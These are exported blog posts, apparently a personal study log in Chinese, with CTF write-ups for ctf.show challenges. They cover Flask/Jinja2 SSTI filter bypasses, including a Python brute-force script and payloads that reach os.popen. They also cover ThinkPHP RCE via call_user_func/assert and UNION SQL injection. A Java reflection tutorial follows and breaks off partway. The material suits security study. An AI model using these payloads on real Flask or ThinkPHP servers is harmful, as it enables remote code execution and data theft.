<p>绕过方法就是使用 365 题的字符串拼接，但是下划线被 ban，<strong>str</strong>()不能用，需要用 string 过滤器得到 config 字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符<br>
原文链接：<a href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭SSL警告</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://4adba2d6-7c76-4a18-936b-ba722cbefdc9.challenge.ctf.show/?name=&#123;&#123;%print(config|string|list).pop(&#123;&#125;).lower()%&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;__globals__&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;os&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;cat /flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        r = requests.get(url=url.<span class="built_in">format</span>(i), headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        location = r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word = r.text[location + <span class="number">4</span>:location + <span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word == j.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;(config|string|list).pop(%d).lower() == %s&quot;</span> % (i, j))</span><br><span class="line">            result += <span class="string">&quot;(config|string|list).pop(%d).lower()~&quot;</span> % i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result[:-<span class="number">1</span>])  <span class="comment"># 去掉最后一个 ~</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __globals__</span></span><br><span class="line"><span class="comment"># (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()</span></span><br><span class="line"><span class="comment"># os</span></span><br><span class="line"><span class="comment"># (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()</span></span><br><span class="line"><span class="comment"># cat /flag</span></span><br><span class="line"><span class="comment"># (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()</span></span><br><span class="line"><span class="comment"># 通过字符串拼接符号~链接</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 原来的：lipsum.__globals__[&quot;os&quot;].popen(&quot;cat /flag&quot;).read()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 通过修改的：&#123;%print(lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read()%&#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   来个明显一点的：</span></span><br><span class="line"><span class="comment">#  &#123;% print(</span></span><br><span class="line"><span class="comment">#     lipsum</span></span><br><span class="line"><span class="comment">#     | attr(</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower() ~  # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower() ~  # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(6).lower()  ~  # &#x27;g&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(41).lower() ~  # &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(2).lower()  ~  # &#x27;o&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(33).lower() ~  # &#x27;b&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(40).lower() ~  # &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(41).lower() ~  # &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(42).lower() ~  # &#x27;s&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower() ~  # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower()     # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"><span class="comment">#     .get(</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(2).lower() ~     # &#x27;o&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(42).lower()      # &#x27;s&#x27;</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"><span class="comment">#     .popen(</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(1).lower()  ~  # &#x27;c&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(40).lower() ~  # &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(23).lower() ~  # &#x27;t&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(7).lower()  ~  # &#x27; &#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(279).lower()~  # &#x27;/&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(4).lower()  ~  # &#x27;f&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(41).lower() ~  # &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(40).lower() ~  # &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(6).lower()     # &#x27;g&#x27;</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"><span class="comment">#     .read()</span></span><br><span class="line"><span class="comment"># ) %&#125;</span></span><br><span class="line"><span class="comment">#&#123;%print((lipsum|attr(&#x27;__globals__&#x27;).get(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())%&#125;</span></span><br><span class="line"><span class="comment">#&#123;%print(__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read())</span></span><br><span class="line"><span class="comment">#%&#125;</span></span><br></pre></td></tr></table></figure>
<p>还有两个在<a href="https://blog.csdn.net/q20010619/article/details/120493997%E6%97%A0%E5%9B%9E%E6%98%BE%E8%BF%87%E6%BB%A4count%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BE">https://blog.csdn.net/q20010619/article/details/120493997无回显过滤count、无回显</a></p>
<h1>web361</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti</p>
<ul>
<li><code>__class__</code></li>
</ul>
<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class 'str'&gt;</code>。</p>
<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所直接继承的类。</p>
<ul>
<li><code>__base__</code></li>
</ul>
<p>以字符串返回一个类所直接继承的类。</p>
<ul>
<li><code>__mro__</code></li>
</ul>
<p>返回解析方法调用的顺序。</p>
<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>获取类的所有子类。</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
<p><img src="/2025/03/06/SSTI/image-20250306204920105.png" alt="image-20250306204920105"></p>
<p>使用os._wrap_close</p>
<p><strong>通过 <code>class</code> 跳转到类</strong></p>
<p><code>class</code> -&gt; <code>mro</code> -&gt; <code>subclasses</code> -&gt; <code>init</code> -&gt; <code>globals</code>是一种常见的利用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p><code>__class__</code>，攻击者可以从一个已知的对象（如空字符串 <code>&quot;&quot;</code> 或数字 <code>0</code>）跳转到它的类，进而利用类的属性和方法（如 <code>__mro__</code>、<code>__subclasses__</code> 等）来进一步探索和利用。</p>
<p><strong>通过 <code>mro</code> 获取继承链</strong>    	 <strong>跳转到 <code>object</code> 类</strong></p>
<p>通过 <code>__mro__</code>，攻击者可以访问 <code>object</code> 类，然后通过 <code>__subclasses__</code> 获取所有已加载的子类。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br></pre></td></tr></table></figure>
<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line">&quot;&quot;.__class__.__mro__[0]  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
<p>通过 <code>__subclasses__</code>，攻击者可以找到一个可以利用的子类，然后通过 <code>__init__</code> 访问该类的初始化方法。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__  # 返回某个子类的 __init__ 方法</span><br></pre></td></tr></table></figure>
<p><code>__init__</code> 的作用是让攻击者能够访问类的构造函数，从而进一步访问 <code>__globals__</code>。</p>
<p><code>__init__</code>在调用某函数前会被使用，所以使用<code>__init__</code>是为了给global做铺垫</p>
<p>通过 <code>__init__</code>，攻击者可以访问 <code>__globals__</code>，即函数的全局命名空间。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__  # 返回全局命名空间</span><br></pre></td></tr></table></figure>
<p><code>__globals__</code> 的作用是让攻击者能够访问模块的全局变量，包括导入的模块（如 <code>os</code>、<code>subprocess</code> 等），从而实现任意代码执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 从对象跳转到类</span><br><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 2. 通过 mro 获取继承链</span><br><span class="line">&quot;&quot;.__class__.__mro__  # 返回 (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line"># 3. 跳转到 object 类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 4. 获取所有子类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br><span class="line"></span><br><span class="line"># 5. 寻找可利用的类（如包含 os 模块的类）X需要具体找</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X]</span><br><span class="line"></span><br><span class="line"># 6. 通过子类执行任意代码</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].system(&#x27;id&#x27;)</span><br></pre></td></tr></table></figure>
<p>下面这条链接有具体的原理解释，并且有推荐视频在链接的最下方</p>
<p><a href="https://blog.csdn.net/qq_61955196/article/details/132237648">https://blog.csdn.net/qq_61955196/article/details/132237648</a></p>
<h1>web362</h1>
<p>过滤了某些东西</p>
<p>好像是过滤了某些数字，从120到某些数字，但是这里的过滤有bug</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[400-50-50-50-50-50-18].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>就可以了</p>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;[].__class__.__base__.__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>builtins介绍：<a href="https://www.cnblogs.com/Ladylittleleaf/p/10240096.html">https://www.cnblogs.com/Ladylittleleaf/p/10240096.html</a></p>
<h1>web363</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了’'和&quot;&quot;</p>
<p>用request来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=popen&amp;b=cat /flag&amp;name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1>web364</h1>
<p>利用cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;x.__init__.__globals__.__builtins__.eval(request.cookies.a)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.a)&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie: a=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>
<h1>web365</h1>
<p>过滤了中括号</p>
<p>同364</p>
<h1>web366</h1>
<p>flask过滤器<a href="https://blog.csdn.net/xujin0/article/details/96101004">https://blog.csdn.net/xujin0/article/details/96101004</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure>
<h1>web367</h1>
<p>在366的基础上又ban了os</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=b=os&amp;name=&#123;&#123;(lipsum|attr(request.cookies.a)).get(request.values.b).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br><span class="line">或者全换了</span><br><span class="line">?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1>web368</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤了&#123;&#123;&#125;&#125;通过&#123;%%&#125;绕过，&#123;%%&#125;是执行函数用的，需要套用print</span><br><span class="line">?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP</title>
    <url>/2025/04/14/ThinkPHP/</url>
    <content><![CDATA[<p><a href="https://www.kancloud.cn/manual/thinkphp/1678">前置知识</a></p>
<p>ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。PHP 框架像是一个工具箱，提供了开发 web 应用所需的所有基本工具，帮助开发者更快速、更安全地完成开发任务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php/模块/控制器/操作</span><br></pre></td></tr></table></figure>
<h1>web569</h1>
<p>/index.php/admin/login/ctfshowlogin</p>
<h1>web570</h1>
<p>有一个闭包函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;ctfshow/:f/:a&#x27; =&gt;function($f,$a)&#123;</span><br><span class="line">    call_user_func($f, $a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/ctfshow/assert/assert($_POST[&#x27;zmr&#x27;])</span><br><span class="line"></span><br><span class="line">zmr=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
<h1>web571</h1>
<p>没有直接给后门什么的</p>
<p>但是有一个</p>
<p><img src="/2025/04/14/ThinkPHP/D:%5CBlog%5Csource_posts%5CThinkPHP%5Cimage-20250412145555374.png" alt="image-20250412145555374"></p>
<p>没有定义位置，这是一个thinkphp自带的函数，我们去前置知识看看</p>
<p><img src="/2025/04/14/ThinkPHP/D:%5CBlog%5Csource_posts%5CThinkPHP%5Cimage-20250412145827314.png" alt="image-20250412145827314"></p>
<p><img src="/2025/04/14/ThinkPHP/D:%5CBlog%5Csource_posts%5CThinkPHP%5Cimage-20250412150340705.png" alt="image-20250412150340705"></p>
<p>意思就是他可以解析我们的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?n=&lt;?php system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
<h1>web572</h1>
<p><strong>此题需要使用爆破来获得关键信息，非扫描，爆破次数不会超过365次，否则均为无效操作</strong></p>
<p><strong>ThinkPHP在开启DEBUG的情况下会在Runtime目录下生成日志，而且debug很多站都没关，其目录结构为 <code>Application\Runtime\Logs\Home\年份_月份_日期.log</code></strong></p>
<p>去bp爆破就可以了</p>
<p><img src="/2025/04/14/ThinkPHP/D:%5CBlog%5Csource_posts%5CThinkPHP%5Cimage-20250412152241848.png" alt="image-20250412152241848"></p>
<p>之后比葫芦画瓢拿flag就可以了</p>
<h1>web573</h1>
<p>thinkphp的sql注入</p>
<p>这里的id需要一个键值where</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?id[where]=id=1 and 1=2 union select 1,group_concat(table_name),3,4  from information_schema.tables where table_schema=database()#</span><br><span class="line"></span><br><span class="line">index.php?id[where]=id=1 and 1=2 union select 1,group_concat(column_name),3,4  from information_schema.columns where table_name=&#x27;flags&#x27;#</span><br><span class="line"></span><br><span class="line">index.php?id[where]=id=1 and 1=2 union select 1,group_concat(flag4s),3,4  from flags#</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射</title>
    <url>/2025/04/19/Java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<p><a href="https://xz.aliyun.com/news/12095">参考博客1</a></p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/07/03/Java%E5%8F%8D%E5%B0%84/">参考博客2</a></p>
<h1>Java反射</h1>
<h2 id="前置概念——正射">前置概念——正射</h2>
<p>在Java反射开始前先用几个字概括一下Java正射：new实例化对象。</p>
<p>然后再用一堆东西具体解释Java正射：</p>
<p>《Java编程思想》中提到了’<strong>万物皆为对象</strong>‘的概念，确实如此，衣服，鸡，篮球，人等等个体都是对象，他们都有自己的特征。类的实例化就是对象，对象有其对应的属性，方法和构造器。这里拿手机来举例，手机是一类高科技产品的实例化，在现实生活中所存在的，那么手机我们可以看成是一个对象，它有名字，有重量，有生产日期，这些我们称为它的属性，那么它的整体外壳我们看成是它的构造器，那么当我们按下电源键的时候，它会亮屏，我们把这个称之为一种方法，使它开机亮屏的方法，这种方法可以作用在我这个对象上，对对象产生影响。</p>
<p>那么我们不妨来试试<strong>定义一个类</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//在Java中定义一个类使用关键字class,一个合法的标识符和一对表示程序体的大括号</span><br><span class="line"></span><br><span class="line">public class phone &#123; //声明一个phone类</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们添加上一些属性:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone &#123;</span><br><span class="line">    public String name; //声明一个字符串类型的name属性</span><br><span class="line">    public double weight; //声明一个浮点型的weight属性</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们再加上构造器:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public double weight;</span><br><span class="line">    public phone()&#123; //无参构造器，当我们自己没声明时，系统会自动给我们声明，方便我们实例化这个类</span><br><span class="line">    &#125;</span><br><span class="line">    public phone(String name,double weight)&#123; //有参构造器，我们需要自己声明，方便我们在构造实例化对象时给属性赋值</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.weight=weight;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最后我们写入一些方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public double weight;</span><br><span class="line">    public phone()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public phone(String name,double weight)&#123;</span><br><span class="line">        this.name=name;</span><br><span class="line">        this.weight=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    public void dianyuan()&#123; //定义一个无返回值的方法，调用会打印&quot;开机&quot;</span><br><span class="line">        System.*out*.println(&quot;开机&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public void setName(String name)&#123; //定义一个形参为String类型的方法，调用后给name属性赋值</span><br><span class="line">        this.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    public String getName()&#123; //定义一个调用后返回name属性的值的方法</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setWeight(double weight)&#123; //定义一个形参为double类型的方法，调用后给weight属性赋值</span><br><span class="line">        this.weight=weight;</span><br><span class="line">    &#125;</span><br><span class="line">    public double getWeight()&#123; //定义一个调用后返回weight属性的值的方法</span><br><span class="line">        return weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到此我们就简单的构造好一个类了，现在我们需要对它进行实例化为对象。</p>
<p><strong>实例化一个类（对象的创建）</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone_tes &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        phone p=new phone(); //使用关键字new来实例化类，并且声明是phone类型的。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就拿到了一个’手机’，那么接下来我们就可以操作这台’手机’:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone_tes &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        phone p=new phone();</span><br><span class="line">        //设置它的属性</span><br><span class="line">        p.name=&quot;8848&quot;;</span><br><span class="line">        p.weight=114514;</span><br><span class="line">        System.out.println(p.name);</span><br><span class="line">        System.out.println(p.weight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180013-12a2da04-17f6-1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone_tes &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        phone p=new phone();</span><br><span class="line">        //调用dianyuan这个方法</span><br><span class="line">        p.dianyuan();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180047-26944566-17f6-1.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone_tes &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        phone p=new phone();</span><br><span class="line">        //调用之前定义的setxxxx方法和getxxxx方法给属性赋值和打印</span><br><span class="line">        p.setName(&quot;8848&quot;);</span><br><span class="line">        System.out.println(p.getName());</span><br><span class="line">        p.setWeight(114514);</span><br><span class="line">        System.out.println(p.getWeight());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180103-30607038-17f6-1.png" alt="img"></p>
<p>补充:这里我们因为我们设置了含参的构造器，所以可以直接在实例化时就赋值:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class phone_tes &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        phone p=new phone(&quot;8848&quot;,114514);</span><br><span class="line">        System.*out*.println(p.name);</span><br><span class="line">        System.*out*.println(p.weight);</span><br><span class="line">        //如果我们没有设置含参的构造器，那么就不能直接赋值</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180119-39aa0ffa-17f6-1.png" alt="img"></p>
<h2 id="1-概念简述">1.概念简述</h2>
<p>Java 的<strong>反射机制</strong>是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法； 并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。</p>
<p>而我们之前在上面介绍的运用new关键字去实例化类的过程就叫做<strong>正射</strong>。那么假如，我是说如果我们一开始并不知道我们要初始化的类对象是什么，那么阁下该如何应对呢?</p>
<p>所以总的来说，就是当我在程序运行前并不知道我们要实例什么类的时候，我们就需要运用反射，通过反射我们可以获取这个类的原型，然后为所欲为。</p>
<h2 id="2-反射的调用">2.反射的调用*</h2>
<h3 id="①-获取类class">①.获取类class</h3>
<p>常见获取对象class的三种方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.使用class.forName()方法</span></span><br><span class="line"></span><br><span class="line">Class p=Class.forName(<span class="string">&quot;test.phone&quot;</span>); <span class="comment">//里面要填:类所在的包名+类名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用实例化对象的getClass()方法</span></span><br><span class="line"></span><br><span class="line">phone p=<span class="keyword">new</span> <span class="title class_">phone</span>(); <span class="comment">//实例化对象</span></span><br><span class="line">Class p1=p.getClass();<span class="comment">//通过实例化对象来获取完整类的原型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里我们已经获取到了实例化对象了。我们运用反射的原因是可以利用反射来访问一些私有属性和私有方法。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.使用类的class方法</span></span><br><span class="line"></span><br><span class="line"> Class p=phone.class;</span><br></pre></td></tr></table></figure>
<h3 id="②-获取实例化对象object">②.获取实例化对象object</h3>
<p>常见获取实例化对象的两种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1.通过class的newInstance()方法</span><br><span class="line"></span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Object p1=p.newInstance();</span><br><span class="line">//这里也有另一种写法,区别是要进行强制类型转化</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">phone p1=(phone)p.newInstance();</span><br><span class="line"></span><br><span class="line">//2.通过constructor的newInstance()方法</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Constructor constructor=p.getConstructor();</span><br><span class="line">Object p1=constructor.newInstance();//这里同上一样有另一种写法，就不再赘述</span><br><span class="line"></span><br><span class="line">//运用这种方法前需要先调用它的无参构造器，然后再实例化</span><br></pre></td></tr></table></figure>
<p>第二种写法后面经过了解后我才知道一般可以用来调用含参的构造器。因为class的newInstance()方法,需要我们类中存在无参的构造器，它通过无参的构造器来实例化，而一旦我们类中不存在无参构造器，那么第一种方法就不行了,如下图所示:</p>
